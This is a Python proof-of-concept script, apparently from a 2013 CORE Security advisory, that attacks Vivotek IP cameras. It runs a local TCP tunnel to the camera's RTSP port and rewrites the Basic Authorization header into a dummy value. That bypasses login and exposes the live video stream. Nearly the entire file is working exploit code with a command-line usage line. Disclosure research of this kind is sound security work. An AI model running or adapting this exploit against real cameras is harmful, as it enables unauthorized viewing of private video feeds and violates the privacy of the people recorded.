/-----
#
# poc.py
#
# The contents of this software are copyright (c) 2013 CORE Security and
(c) 2013 CoreLabs,
# and are licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 (United States)
# License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE.
#

import sys
from socket import *
from threading import Thread
import time

LOGGING = 1

def log(s):
    if LOGGING:
        print '(%s) %s' % (time.ctime(), s)


class UDPRequestHandler(Thread):
    def __init__(self, data_to_send, recv_addr, dst_addr):
        Thread.__init__(self)
        self.data_to_send = data_to_send
        self.recv_addr = recv_addr
        self.dst_addr = dst_addr

    def run(self):
        sender = socket(AF_INET, SOCK_DGRAM)
        sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        sender.sendto(self.data_to_send, self.dst_addr)
        response = sender.recv(1024)
        sender.sendto(response, self.recv_addr)
        sender.close()


class UDPDispatcher(Thread):
    dispatchers = []

    def __has_dispatcher_for(self, port):
        return any([d.src_port == port for d in UDPDispatcher.dispatchers])

    def __init__(self, src_port, dst_addr):
        Thread.__init__(self)
        if self.__has_dispatcher_for(src_port):
            raise Exception('There is already a dispatcher for port %d'
% src_port)
        self.src_port = src_port
        self.dst_addr = dst_addr
        UDPDispatcher.dispatchers.append(self)

    def run(self):
        listener = socket(AF_INET, SOCK_DGRAM)
        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        listener.bind(('', self.src_port))
        while 1:
            try:
                data, recv_addr = listener.recvfrom(1024)
                if not data: break
                UDPRequestHandler(data, recv_addr, self.dst_addr).start()
            except Exception as e:
                print e
                break
        listener.close()
        UDPDispatcher.dispatchers.remove(self)


class PipeThread(Thread):
    pipes = []

    def __init__(self, source, sink, process_data_callback=lambda x: x):
        Thread.__init__(self)
        self.source = source
        self.sink = sink
        self.process_data_callback = process_data_callback
        PipeThread.pipes.append(self)

    def run(self):
        while 1:
            try:
                data = self.source.recv(1024)
                data = self.process_data_callback(data)
                if not data: break
                self.sink.send(data)
            except Exception as e:
                log(e)
                break
        PipeThread.pipes.remove(self)


class TCPTunnel(Thread):
    def __init__(self, src_port, dst_addr, process_data_callback=lambda
x: x):
        Thread.__init__(self)
        log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
dst_addr[0], dst_addr[1]))
        self.dst_addr = dst_addr
        self.process_data_callback = process_data_callback
        # Create TCP listener socket
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.sock.bind(('', src_port))
        log('[*] Check live stream in rtsp://localhost:%d/live.sdp' %
src_port)
        self.sock.listen(5)

    def run(self):
        while 1:
            # Wait until a new connection arises
            newsock, address = self.sock.accept()
            # Create forwarder socket
            fwd = socket(AF_INET, SOCK_STREAM)
            fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            fwd.connect(self.dst_addr)
            # Pipe them!
            PipeThread(newsock, fwd, self.process_data_callback).start()
            PipeThread(fwd, newsock, self.process_data_callback).start()


class Camera():
    def __init__(self, address):
        self.address = address

    def get_describe_data(self):
        return ''


class Vivotek(Camera):
    def __init__(self, address):
        Camera.__init__(self, address)

    def get_describe_data(self):
        return 'v=0\r\no=RTSP 836244 0 IN IP4 0.0.0.0\r\ns=RTSP
server\r\nc=IN IP4 0.0.0.0\r\nt=0
0\r\na=charset:Shift_JIS\r\na=range:npt=0-\r\na=control:*\r\na=etag:1234567890\r\nm=video
0 RTP/AVP 96\r\nb=AS:1200\r\na=rtpmap:96
MP4V-ES/30000\r\na=control:trackID=1\r\na=fmtp:96
profile-level-id=3;config=000001B003000001B509000001000000012000C48881F4514043C1463F;decode_buf=76800\r\nm=audio
0 RTP/AVP 97\r\na=control:trackID=3\r\na=rtpmap:97
mpeg4-generic/16000/2\r\na=fmtp:97 streamtype=5; profile-level-id=15;
mode=AAC-hbr; config=1410;SizeLength=13; IndexLength=3;
IndexDeltaLength=3; CTSDeltaLength=0; DTSDeltaLength=0;\r\n'


class RTSPAuthByPasser():
    DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
    UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
    SERVER_PORT_ARGUMENTS = 'server_port='
    DEFAULT_CSEQ = 1
    DEFAULT_SERVER_PORT_RANGE = '5556-5559'

    def __init__(self, local_port, camera):
        self.last_describe_req = ''
        self.camera = camera
        self.local_port = local_port

    def start(self):
        log('[!] Starting bypasser')
        TCPTunnel(self.local_port, self.camera.address,
self.spoof_rtsp_conn).start()

    def spoof_rtsp_conn(self, data):
        auth_string = "Authorization: Basic"
        if auth_string in data:
            data = data.split("\r\n")
            new_data = []
            for line in data:
                new_data.append(line if auth_string not in line else
auth_string + " a")
            data = "\r\n".join(new_data)
        return data


if __name__ == '__main__':
    if len(sys.argv) > 1:
        listener_port = camera_port = int(sys.argv[1])
        camera_ip = sys.argv[2]
        if len(sys.argv) == 4:
            camera_port = int(sys.argv[3])
        RTSPAuthByPasser(listener_port, Vivotek((camera_ip,
camera_port))).start()
    else:
        print 'usage: python %s [local_port] [camera_ip]
[camera_rtsp_port]'  

-----/
